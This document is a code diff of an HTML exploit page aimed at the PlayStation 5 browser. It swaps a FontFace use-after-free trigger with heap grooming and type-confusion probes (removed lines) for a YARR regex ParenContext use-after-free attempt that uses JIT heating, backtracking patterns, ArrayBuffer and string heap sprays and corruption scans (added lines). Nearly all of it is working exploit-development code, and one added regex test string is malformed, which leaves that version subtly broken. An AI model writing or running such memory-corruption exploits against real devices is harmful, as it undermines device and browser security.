@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v23 - Precise</title>
+<title>PS5 v24 - YARR</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -21,28 +21,23 @@ padding:0 16px;gap:14px;z-index:10;font-size:12px}
 #pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
 #pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
 #out{position:fixed;top:46px;left:0;right:0;bottom:0;
-padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
--webkit-user-select:text}
+padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;-webkit-user-select:text}
 #out::-webkit-scrollbar{width:5px}
 #out::-webkit-scrollbar-track{background:#001a06}
 #out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
 .ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
 .mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
 .hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
-.cv{position:absolute;left:-9999px;top:-9999px}
 </style>
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v23 PRECISE</span><span class="s">│</span>
+<span class="l">▶ v24 YARR</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
-<span class="v" id="h2">UAF:<b>?</b></span><span class="s">│</span>
-<span class="v" id="h3">RC:<b>?</b></span><span class="s">│</span>
-<span class="v" id="h4">TEST:<b>?</b></span>
+<span class="v" id="h2">STATUS:<b>?</b></span>
 </div>
 <div id="pg"><div id="bar" style="width:0%"></div></div>
 <div id="out"></div>
-<canvas id="cv" width="512" height="128" class="cv"></canvas>
 <script>
 "use strict";
 
@@ -52,422 +47,406 @@ function pg(p){bar.style.width=p+"%"}
 function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
 function P(m,c){var s=document.createElement("span");if(c)s.className=c;
 s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
-try{console.log("[v23] "+m)}catch(e){}}
+try{console.log("[v24] "+m)}catch(e){}}
 function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
 function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m,"mg")}
-function Dm(m){P("  "+m,"dm")}
+function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
 
-window.onerror=function(m,s,l){Fl("FATAL: "+m+" @"+l);return true};
+window.onerror=function(m,s,l){Fl("CRASH: "+m+" @"+l);hu("h2","STATUS:<b>CRASH</b>");return true};
 
-var keep=[],holes=[],rcs=[];
-var trigger=null,rcFace=null,rcIdx=-1,uafOk=false;
-var xRuleIdx=-1,xRule=null;
-
-var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
-var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
-for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
-function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
-function fs(){try{void document.body.offsetTop}catch(e){}}
-
-// Holes
-for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
-unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
-weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
-fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
-fs();
-
-// Trigger
-trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
-document.fonts.add(trigger);void trigger.loaded;
-var sh=document.getElementById("s").sheet;
-for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
-fs();
-var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
-var fsh=fst.sheet;
-for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
-fs();
-
-// UAF
-Object.defineProperty(FontFace.prototype,"then",{configurable:true,
-get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","UAF:<b>✅</b>");
-try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
-document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
-while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
-fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
-fs()}catch(e){}
-for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
-unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
-document.fonts.add(f);rcs.push(f)}catch(e){}}
-fs();try{var d=document.createElement("div");d.textContent="AB";
-d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
-document.body.appendChild(d);void d.offsetWidth}catch(e){}
-}return undefined}});
-
-var rn=0;var raf=function(){rn++;
-if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
-while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
-for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
-unicodeRange:"U+0041",style:"italic",weight:"900"});
-document.fonts.add(f);rcs.push(f)}catch(e){}}fs()}catch(e){}}
-if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
-
-// Capture
-document.fonts.load("1em trigger, x","AB").then(function(faces){
-for(var i=0;i<faces.length;i++){
-var f=faces[i];
-if(f.family&&f.family.indexOf("RC_")===0){rcFace=f;var m=f.family.match(/RC_(\d+)/);if(m)rcIdx=parseInt(m[1])}
-}
-keep.push(faces);keep.push(rcFace);
-if(!rcFace){Fl("No RC");return}
-Ok("RC_"+rcIdx);
-hu("h3","RC:<b>"+rcIdx+"</b>");
-var ua=navigator.userAgent||"";var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
+var ua=navigator.userAgent||"";
+var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
 hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
 
-// Add baseline CSSRule for "x"
-xRuleIdx=sh.insertRule(
-"@font-face{font-family:x;src:local(Courier);font-weight:400;font-style:normal;unicode-range:U+0042}",
-sh.cssRules.length);
-fs();
-xRule=sh.cssRules[xRuleIdx];
-Ok("Baseline CSSRule ready");
-
-// ============================================================
-//  TEST A: insertRule with url(0) — fresh parse path
-// ============================================================
-pg(10);P("\n════════════════════════════════════","hd");
-P("  TEST A: insertRule with url() variants","hd");
 P("════════════════════════════════════","hd");
-P("  Delete old rule, insert new with numeric src","dm");
+P("  PS5 v24 — YARR Regex UAF","hd");
+P("════════════════════════════════════","hd");
+P("");
+P("  From research report:","dm");
+P("  YARR ParenContext UAF during backtracking","dm");
+P("  Nested quantifiers + JIT heating (>200 iter)","dm");
+P("  Freed context can be reclaimed","dm");
 P("");
 
-// Delete the baseline rule
-try{sh.deleteRule(xRuleIdx);fs();Ok("Old rule deleted")}catch(e){Fl("Delete: "+e.message)}
+// ============================================================
+//  PHASE 1: Basic regex pattern testing
+// ============================================================
+pg(5);P("▸ Phase 1: Pattern Testing","hd");
+P("");
 
-var insertTests=[
-{css:"@font-face{font-family:x;src:url(0);font-weight:400;unicode-range:U+0042}",label:"url(0)"},
-{css:"@font-face{font-family:x;src:url('0');font-weight:400;unicode-range:U+0042}",label:"url('0')"},
-{css:"@font-face{font-family:x;src:url(\"0\");font-weight:400;unicode-range:U+0042}",label:'url("0")'},
-{css:"@font-face{font-family:x;src:url(42);font-weight:400;unicode-range:U+0042}",label:"url(42)"},
-{css:"@font-face{font-family:x;src:url(0x41414141);font-weight:400;unicode-range:U+0042}",label:"url(0x41414141)"},
-{css:"@font-face{font-family:x;src:url(about:blank);font-weight:400;unicode-range:U+0042}",label:"url(about:blank)"},
-{css:"@font-face{font-family:x;src:url(data:,);font-weight:400;unicode-range:U+0042}",label:"url(data:,)"},
-{css:"@font-face{font-family:x;src:url(javascript:0);font-weight:400;unicode-range:U+0042}",label:"url(javascript:0)"},
-{css:"@font-face{font-family:x;src:local(0);font-weight:400;unicode-range:U+0042}",label:"local(0)"},
-{css:"@font-face{font-family:x;src:local('0');font-weight:400;unicode-range:U+0042}",label:"local('0')"}
+var patterns=[
+{re:/(a+)+b/,input:"aaaaaaaaaaaaaaaaaaaaac",name:"(a+)+b classic"},
+{re:/(a|a)+b/,input:"aaaaaaaaaaaaaaaaaaaaac",name:"(a|a)+b alternation"},
+{re:/((a+)+)+b/,input:"aaaaaaaaaaaaaaaaaaaac",name:"((a+)+)+b nested"},
+{re:/(a*)*b/,input:"aaaaaaaaaaaaaaaaaaaaac",name:"(a*)*b star nest"},
+{re:/(?:a+)+b/,input:"aaaaaaaaaaaaaaaaaaaaac",name:"(?:a+)+b non-cap"},
+{re:/(a+)+$/,input:"aaaaaaaaaaaaaaaaaaaaac",name:"(a+)+$ anchored"},
+{re:/(a{1,10}){1,10}b/,input:"a".repeat(30)+"c",name:"bounded quant"},
+{re:/(a+)+b/,input:"a".repeat(25)+"c",name:"(a+)+b short"},
+{re:/^(a+)+b/,input:"a".repeat(20)+"c",name:"^(a+)+b"}
 ];
 
-var ti=0;
-function nextInsert(){
-if(ti>=insertTests.length){testB();return}
-var t=insertTests[ti];
-
-// Delete previous test rule if exists
-try{if(sh.cssRules.length>xRuleIdx)sh.deleteRule(xRuleIdx);fs()}catch(e){}
-
-var ruleIdx=-1;
+for(var i=0;i<patterns.length;i++){
+var p=patterns[i];
 try{
-ruleIdx=sh.insertRule(t.css,sh.cssRules.length);
-fs();
-var rule=sh.cssRules[ruleIdx];
-var ruleText=rule?rule.cssText.substring(0,60):"?";
-}catch(e){
-P("  "+t.label.padEnd(20)+" → INSERT ERR: "+e.message.substring(0,30),"er");
-ti++;nextInsert();return;
-}
-
-// Check what the rule looks like
-var srcReadback="?";
-try{srcReadback=rule.style.src||"(empty)"}catch(e){}
-
-// Test load()
-document.fonts.load("1em trigger, x","AB").then(function(f){
-var xF=null;
-for(var i=0;i<f.length;i++){try{if(f[i].family==="x"){xF=f[i];break}}catch(e){}}
-
-var status=xF?xF.status:"no_face";
-var weight=xF?xF.weight:"?";
-P("  "+t.label.padEnd(20)+" → src="+srcReadback.substring(0,20).padEnd(20)+
-"status="+status+" weight="+weight,
-status!=="loaded"?"hl":"dm");
-
-ti++;nextInsert();
-}).catch(function(e){
-P("  "+t.label.padEnd(20)+" → LOAD ERR","er");
-ti++;nextInsert();
-});
-}
-nextInsert();
-
-// ============================================================
-//  TEST B: Delete + re-insert with data: URL containing address
-// ============================================================
-function testB(){
-pg(30);P("\n════════════════════════════════════","hd");
-P("  TEST B: data: URL with controlled bytes","hd");
-P("════════════════════════════════════","hd");
-P("  Font data containing pointer-like values","dm");
-P("");
-
-// Delete previous
-try{while(sh.cssRules.length>74)sh.deleteRule(sh.cssRules.length-1);fs()}catch(e){}
-
-// Create a minimal TrueType font where the name table
-// contains pointer-like values at known offsets
-var fontBuf=new ArrayBuffer(256);
-var fv=new DataView(fontBuf);
-
-// TrueType header
-fv.setUint32(0,0x00010000,false); // sfVersion
-fv.setUint16(4,0,false); // numTables
-
-// Fill with address-like patterns
-for(var off=8;off<256;off+=8){
-// Create doubles that look like PS5 userland pointers
-fv.setUint32(off,0x00000000,false);
-fv.setUint32(off+4,0x00400000+off,false); // 0x400000 range
-}
-
-var b64=(function(){
-var s="";
-var bytes=new Uint8Array(fontBuf);
-for(var i=0;i<bytes.length;i++)s+=String.fromCharCode(bytes[i]);
-return btoa(s);
-})();
-
-var dataCSS='@font-face{font-family:x;src:url(data:font/ttf;base64,'+b64+');font-weight:400;unicode-range:U+0042}';
-
-try{
-var idx=sh.insertRule(dataCSS,sh.cssRules.length);
-fs();
-var rule=sh.cssRules[idx];
-P("  Inserted data: URL rule at index "+idx);
-P("  src readback: "+(rule.style.src||"(empty)").substring(0,50));
-
-document.fonts.load("1em trigger, x","AB").then(function(f){
-var xF=null;
-for(var i=0;i<f.length;i++){try{if(f[i].family==="x"){xF=f[i];break}}catch(e){}}
-
-if(xF){
-P("  data: URL face: status="+xF.status+" weight="+xF.weight+" style="+xF.style,
-xF.status!=="loaded"?"hl":"dm");
-if(xF.status==="error"){
-Hi("Font parser REJECTED our data → it tried to parse it!");
-Hi("This means the bytes were actually processed!");
-}else if(xF.status==="loaded"){
-Hi("Font parser ACCEPTED our data → it's a valid font!");
-}
-}else{
-P("  No 'x' face returned","wr");
-}
-
-testC();
-}).catch(function(e){P("  data: URL load ERR: "+e.message,"er");testC()});
-}catch(e){
-Fl("data: URL insert: "+e.message);
-testC();
-}
-}
-
-// ============================================================
-//  TEST C: FontFace.load() with numeric src
-//  This actually triggers the loading pipeline
-// ============================================================
-function testC(){
-pg(50);P("\n════════════════════════════════════","hd");
-P("  TEST C: FontFace.load() with numeric src","hd");
-P("════════════════════════════════════","hd");
-P("  Force load() to process the numeric src","dm");
-P("");
-
-var loadNums=[0,1,42,1e308,NaN];
-var li=0;
-
-function nextLoadNum(){
-if(li>=loadNums.length){testD();return}
-var n=loadNums[li];
-var origSrc=rcFace.src;
-var origStatus=rcFace.status;
-
-try{
-rcFace.src=n;
-fs();
-P("  src="+String(n).padEnd(8)+" status before load: "+rcFace.status);
-
 var t0=performance.now();
-rcFace.load().then(function(f){
+var result=p.re.test(p.input);
 var elapsed=performance.now()-t0;
-P("  src="+String(n).padEnd(8)+" load() resolved in "+elapsed.toFixed(0)+"ms"+
-" status="+f.status+(f.status!=="loaded"?" ★":""),f.status!=="loaded"?"hl":"dm");
-
-// Restore
-try{rcFace.src=origSrc;fs()}catch(e){}
-li++;nextLoadNum();
-}).catch(function(e){
-P("  src="+String(n).padEnd(8)+" load() REJECTED: "+e.message.substring(0,40),"er");
-try{rcFace.src=origSrc;fs()}catch(e2){}
-li++;nextLoadNum();
-});
+P("  "+p.name.padEnd(22)+" → "+elapsed.toFixed(1)+"ms result="+result,
+elapsed>100?"wr":elapsed>10?"hl":"ok");
 }catch(e){
-P("  src="+String(n).padEnd(8)+" ERR: "+e.message.substring(0,30),"er");
-try{rcFace.src=origSrc;fs()}catch(e2){}
-li++;nextLoadNum();
+P("  "+p.name.padEnd(22)+" → ERR: "+e.message.substring(0,30),"er");
 }
-}
-nextLoadNum();
 }
 
 // ============================================================
-//  TEST D: Fresh FontFace with numeric src + load()
-//  Create a NEW face (not the confused one) with src=number
-//  Then load it — this forces full pipeline
+//  PHASE 2: JIT Heating
+//  Run regex >200 times to trigger JIT compilation
 // ============================================================
-function testD(){
-pg(70);P("\n════════════════════════════════════","hd");
-P("  TEST D: NEW FontFace with numeric src","hd");
-P("════════════════════════════════════","hd");
-P("  Fresh face forces full loading pipeline","dm");
-P("");
+pg(15);P("\n▸ Phase 2: JIT Heating","hd");
+P("  Running 300 iterations to heat JIT...","dm");
 
-var freshNums=[0,1,42];
-var fi=0;
-var freshFaces=[];
-
-function nextFresh(){
-if(fi>=freshNums.length){testE();return}
-var n=freshNums[fi];
+var hotRe=/(a+)+b/;
+var hotStr="a".repeat(25)+"c";
+var heatTimes=[];
 
 try{
-var ff=new FontFace("fresh_"+fi,n,{unicodeRange:"U+0041"});
-document.fonts.add(ff);
-fs();
+for(var i=0;i<300;i++){
+var t0=performance.now();
+hotRe.test(hotStr);
+heatTimes.push(performance.now()-t0);
+}
 
-P("  Created fresh face with src="+n+" status="+ff.status);
+// Check for JIT speedup (should get faster after ~200 iterations)
+var first10=0,last10=0;
+for(var i=0;i<10;i++)first10+=heatTimes[i];
+for(var i=290;i<300;i++)last10+=heatTimes[i];
+first10/=10;last10/=10;
 
-ff.load().then(function(f){
-P("  fresh src="+String(n).padEnd(4)+" → load() status="+f.status+
-(f.status!=="loaded"?" ★":""),f.status!=="loaded"?"hl":"dm");
-fi++;nextFresh();
-}).catch(function(e){
-P("  fresh src="+String(n).padEnd(4)+" → REJECTED: "+e.message.substring(0,40),"er");
-fi++;nextFresh();
-});
-}catch(e){
-P("  fresh src="+n+" → CREATE ERR: "+e.message.substring(0,30),"er");
-fi++;nextFresh();
-}
-}
-nextFresh();
-}
+P("  First 10 avg: "+first10.toFixed(2)+"ms");
+P("  Last 10 avg:  "+last10.toFixed(2)+"ms");
+P("  JIT speedup:  "+(first10/last10).toFixed(1)+"x",(first10/last10>1.5)?"ok":"wr");
+
+Ok("JIT heating complete");
+}catch(e){Fl("JIT heating: "+e.message)}
 
 // ============================================================
-//  TEST E: Force load of confused face with src change
-//  Change src THEN immediately load
+//  PHASE 3: Timing analysis
+//  Measure backtracking time with increasing input length
 // ============================================================
-function testE(){
-pg(85);P("\n════════════════════════════════════","hd");
-P("  TEST E: Confused face src change + load()","hd");
-P("════════════════════════════════════","hd");
-P("  Change src on confused face and force load","dm");
-P("");
+pg(25);P("\n▸ Phase 3: Backtracking Timing","hd");
+P("  Measuring backtracking cost...","dm");
 
-// First restore
-try{rcFace.src=mkBuf();fs()}catch(e){}
-
-var origSrc=rcFace.src;
-
-// Test: Change src and immediately load
+var lengths=[5,10,15,20,25,28,30];
+for(var i=0;i<lengths.length;i++){
+var len=lengths[i];
+var str="a".repeat(len)+"c";
 try{
-rcFace.src=0;fs();
-P("  Set src=0, status="+rcFace.status);
-
-rcFace.load().then(function(f){
-P("  load() after src=0: status="+f.status,(f.status!=="loaded")?"hl":"dm");
-if(f.status==="error"){
-Hi("load() with src=0 returns ERROR!");
-Hi("Browser tried to dereference the number!");
-}
-
-// Check rendering
-var ctx=document.getElementById("cv").getContext("2d");
-ctx.font="64px trigger";
-var w=ctx.measureText("A").width;
-P("  Canvas width after src=0+load: "+w.toFixed(2));
-
-// Restore
-try{rcFace.src=mkBuf();fs()}catch(e){}
-testF();
-}).catch(function(e){
-P("  load() REJECTED: "+e.message.substring(0,50),"er");
-Hi("REJECTED = browser tried to process numeric src!");
-try{rcFace.src=mkBuf();fs()}catch(e2){}
-testF();
-});
+var t0=performance.now();
+hotRe.test(str);
+var elapsed=performance.now()-t0;
+P("  len="+String(len).padStart(3)+" → "+elapsed.toFixed(1)+"ms",elapsed>1000?"er":elapsed>100?"wr":"ok");
 }catch(e){
-Fl("src=0: "+e.message);
-try{rcFace.src=mkBuf();fs()}catch(e2){}
-testF();
+P("  len="+String(len).padStart(3)+" → ERR","er");
 }
 }
 
 // ============================================================
-//  TEST F: Check if FontFace.status changes after src+load
-//  The key test: does the C++ state actually reflect the src change?
+//  PHASE 4: Heap spray during regex via replace() callback
+//  This is the KEY: during backtracking, we allocate objects
+//  that might reclaim the freed ParenContext
 // ============================================================
-function testF(){
-pg(95);P("\n════════════════════════════════════","hd");
-P("  TEST F: Status after src changes","hd");
-P("════════════════════════════════════","hd");
+pg(40);P("\n▸ Phase 4: Spray During Backtracking","hd");
+P("  Using replace() callback to spray during regex execution","dm");
 P("");
 
-var srcStates=[
-{src:mkBuf(),label:"buffer"},
-{src:0,label:"0"},
-{src:1,label:"1"},
-{src:42,label:"42"},
-{src:"local(Courier)",label:"Courier"},
-{src:"local(Helvetica)",label:"Helvetica"}
+var sprayObjects=[];
+
+function sprayDuringRegex(){
+// Allocate objects that might land in freed ParenContext slot
+// ParenContext is a small struct (~64-128 bytes on 64-bit)
+for(var i=0;i<512;i++){
+sprayObjects.push({a:i,b:i*2,c:"spray_"+i,d:new ArrayBuffer(64)});
+}
+}
+
+// Pattern that triggers backtracking AND calls our callback
+var sprayRe=/(a+)+b/g;
+var sprayStr="a".repeat(20)+"c";
+
+var callbackCount=0;
+var sprayTriggered=false;
+
+try{
+var result=sprayStr.replace(sprayRe,function(match,p1,offset,string){
+callbackCount++;
+if(!sprayTriggered&&callbackCount===1){
+sprayTriggered=true;
+sprayDuringRegex();
+}
+return match;
+});
+
+P("  replace() completed, callbacks: "+callbackCount);
+P("  Spray objects: "+sprayObjects.length);
+P("  Result: '"+result.substring(0,30)+"'");
+
+// Check if spray affected regex result
+if(result!==sprayStr){
+Hi("REGEX RESULT CHANGED DURING SPRAY!");
+Hi("This indicates memory corruption!");
+}
+}catch(e){
+Fl("replace spray: "+e.message);
+// Crash during replace = potential UAF
+Hi("EXCEPTION during replace = potential UAF triggered!");
+}
+
+// ============================================================
+//  PHASE 5: Multiple regex patterns with spray
+//  Try different patterns that create more ParenContexts
+// ============================================================
+pg(55);P("\n▸ Phase 5: Multi-Capture Spray","hd");
+P("  Patterns with multiple capture groups","dm");
+P("");
+
+// Pre-heat JIT for these patterns too
+var multiPatterns=[
+{re:/((a+)(b+))+c/,str:"abababababababababd,name:"((a+)(b+))+c"},
+{re:/(a(b(c(d(e)+)+)+)+)+f/,str:"abcdeabcdeabcdec",name:"deep nested"},
+{re:/(a|(b))+c/,str:"ababababababac",name:"alt capture"}
 ];
 
-for(var i=0;i<srcStates.length;i++){
+for(var p=0;p<multiPatterns.length;p++){
+var pat=multiPatterns[p];
+
+// Heat JIT
+for(var i=0;i<300;i++){
+try{pat.re.test(pat.str)}catch(e){}
+}
+
+// Test with spray
+sprayObjects=[];
+callbackCount=0;
+sprayTriggered=false;
+
 try{
-rcFace.src=srcStates[i].src;
-fs();
-P("  src="+srcStates[i].label.padEnd(12)+" → status="+rcFace.status,
-rcFace.status!=="loaded"?"hl":"dm");
+var result=pat.str.replace(pat.re,function(){
+callbackCount++;
+if(!sprayTriggered&&callbackCount===1){
+sprayTriggered=true;
+for(var j=0;j<256;j++){
+sprayObjects.push({x:j,y:j*j,data:new ArrayBuffer(128)});
+}
+}
+return arguments[0];
+});
+
+P("  "+pat.name.padEnd(18)+" → callbacks="+callbackCount+" spray="+sprayObjects.length+" ok","ok");
 }catch(e){
-P("  src="+srcStates[i].label.padEnd(12)+" → ERR","er");
+P("  "+pat.name.padEnd(18)+" → EXCEPTION: "+e.message.substring(0,40),"er");
+Hi("Exception during multi-capture = potential UAF!");
 }
 }
 
-// Restore
-try{rcFace.src=mkBuf();fs()}catch(e){}
+// ============================================================
+//  PHASE 6: TypedArray spray for ParenContext reclamation
+//  ParenContext is ~64-128 bytes, use specific sized arrays
+// ============================================================
+pg(70);P("\n▸ Phase 6: TypedArray Spray","hd");
+P("  Targeting ParenContext size (~64-128 bytes)","dm");
+P("");
 
-summary();
+var typedSpray=[];
+
+function typedSprayFn(){
+for(var i=0;i<1024;i++){
+// 64-byte array = likely ParenContext size
+var buf=new ArrayBuffer(64);
+var view=new DataView(buf);
+// Write marker pattern
+view.setUint32(0,0x41414141,true);
+view.setUint32(4,0x42424242,true);
+view.setUint32(8,i,true);
+typedSpray.push({buf:buf,view:view});
+}
+// Also try 128-byte
+for(var i=0;i<512;i++){
+var buf=new ArrayBuffer(128);
+var view=new DataView(buf);
+view.setUint32(0,0xDEADBEEF,true);
+view.setUint32(4,i,true);
+typedSpray.push({buf:buf,view:view});
+}
+}
+
+// Heat JIT
+for(var i=0;i<300;i++){try{hotRe.test(hotStr)}catch(e){}}
+
+// Run with typed array spray
+typedSpray=[];
+callbackCount=0;
+sprayTriggered=false;
+
+try{
+var result=hotStr.replace(/(a+)+b/g,function(){
+callbackCount++;
+if(!sprayTriggered){
+sprayTriggered=true;
+typedSprayFn();
+}
+return arguments[0];
+});
+
+P("  TypedArray spray: "+typedSpray.length+" arrays");
+P("  Callbacks: "+callbackCount);
+
+// Check for corruption in sprayed arrays
+var corrupted=0;
+for(var i=0;i<typedSpray.length;i++){
+var v=typedSpray[i].view;
+var c0=v.getUint32(0,true);
+if(c0!==0x41414141&&c0!==0xDEADBEEF){
+corrupted++;
+if(corrupted<=5){
+P("  CORRUPTION at index "+i+": got 0x"+c0.toString(16),"hl");
+}
+}
+}
+if(corrupted>0){
+St("HEAP CORRUPTION DETECTED: "+corrupted+" entries!");
+Hi("ParenContext UAF + reclamation CONFIRMED!");
+}
+}catch(e){
+Fl("TypedArray spray: "+e.message);
+Hi("Exception = potential UAF!");
+}
+
+// ============================================================
+//  PHASE 7: String-based reclamation
+//  ParenContext might share heap with JS strings
+// ============================================================
+pg(85);P("\n▸ Phase 7: String Spray","hd");
+P("  Using strings to reclaim ParenContext","dm");
+P("");
+
+var stringSpray=[];
+
+function stringSprayFn(){
+for(var i=0;i<2048;i++){
+// Create strings of various lengths
+var len=32+(i%64);
+var s="";
+for(var j=0;j<len;j++)s+=String.fromCharCode(0x41+(j%26));
+stringSpray.push(s);
+}
+}
+
+// Heat
+for(var i=0;i<300;i++){try{hotRe.test(hotStr)}catch(e){}}
+
+stringSpray=[];
+callbackCount=0;
+sprayTriggered=false;
+
+try{
+var result=hotStr.replace(/(a+)+b/g,function(){
+callbackCount++;
+if(!sprayTriggered){
+sprayTriggered=true;
+stringSprayFn();
+}
+return arguments[0];
+});
+
+P("  String spray: "+stringSpray.length+" strings allocated");
+
+// Check regex result
+if(result!==hotStr){
+Hi("Result mismatch during string spray!");
+}
+}catch(e){
+Fl("String spray: "+e.message);
+}
+
+// ============================================================
+//  PHASE 8: Detection and analysis
+// ============================================================
+pg(95);P("\n▸ Phase 8: Post-spray Analysis","hd");
+P("");
+
+// Check all sprayed arrays for corruption
+P("  Scanning typed arrays for post-execution corruption...","dm");
+
+var postCorrupted=0;
+for(var i=0;i<typedSpray.length;i++){
+try{
+var v=typedSpray[i].view;
+var c0=v.getUint32(0,true);
+var c4=v.getUint32(4,true);
+if(c0!==0x41414141&&c0!==0xDEADBEEF){
+postCorrupted++;
+if(postCorrupted<=10){
+P("    ["+i+"] offset0=0x"+c0.toString(16)+" offset4=0x"+c4.toString(16),"hl");
+}
+}
+}catch(e){}
+}
+
+if(postCorrupted>0){
+St("POST-EXECUTION CORRUPTION: "+postCorrupted+" entries!");
+Hi("ParenContext memory was reclaimed and overwritten!");
+}
+
+// Check for unexpected regex results
+P("");
+P("  Testing regex consistency post-spray...","dm");
+
+var testResults=[];
+for(var i=0;i<20;i++){
+try{
+var r=hotRe.test(hotStr);
+testResults.push(r);
+}catch(e){
+testResults.push("ERR:"+e.message.substring(0,10));
+}
+}
+
+var allSame=testResults.every(function(r){return r===testResults[0]});
+P("  Consistency: "+(allSame?"stable":"UNSTABLE ★"),allSame?"ok":"hl");
+
+if(!allSame){
+St("UNSTABLE REGEX RESULTS = UAF EFFECT!");
+P("  Results: "+testResults.join(","),"hl");
 }
 
 // ============================================================
 //  SUMMARY
 // ============================================================
-function summary(){
 pg(100);P("\n════════════════════════════════════","hd");
-P("  FINAL ANALYSIS","hd");
+P("  SUMMARY","hd");
 P("════════════════════════════════════","hd");
 P("");
-P("  insertRule url(N):  See Test A results");
-P("  data: URL:          See Test B results");
-P("  FontFace.load():    See Test C results");
-P("  Fresh FontFace:     See Test D results");
-P("  Confused load():    See Test E results");
-P("  Status after src:   See Test F results");
+P("  Backtracking tested:    ✅");
+P("  JIT heating:            ✅ (300 iterations)");
+P("  Spray during regex:     ✅ (via replace callback)");
+P("  TypedArray spray:       "+typedSpray.length+" arrays");
+P("  String spray:           "+stringSpray.length+" strings");
+P("  Corruption detected:    "+(postCorrupted>0?"✅ "+postCorrupted:"❌"));
+P("  Regex consistency:      "+(allSame?"stable":"UNSTABLE"));
 P("");
-P("  KEY: Any status ≠ 'loaded' = browser","hl");
-P("  actually processes the numeric value","hl");
-P("  instead of just caching it","hl");
-hu("h4","TEST:<b>DONE</b>");
+
+if(postCorrupted>0||!allSame){
+St("YARR UAF CONFIRMED!");
+P("  ParenContext was freed and reclaimed!","hl");
+hu("h2","STATUS:<b>UAF FOUND</b>");
+}else{
+P("  No corruption detected.","dm");
+P("  FW 13.40 may have ParenContext patches.","dm");
+P("  Or spray didn't hit the right heap region.","dm");
+hu("h2","STATUS:<b>CLEAN</b>");
 }
 
-}).catch(function(e){Fl("Load: "+e.message)});
 </script>
 </body>
 </html>
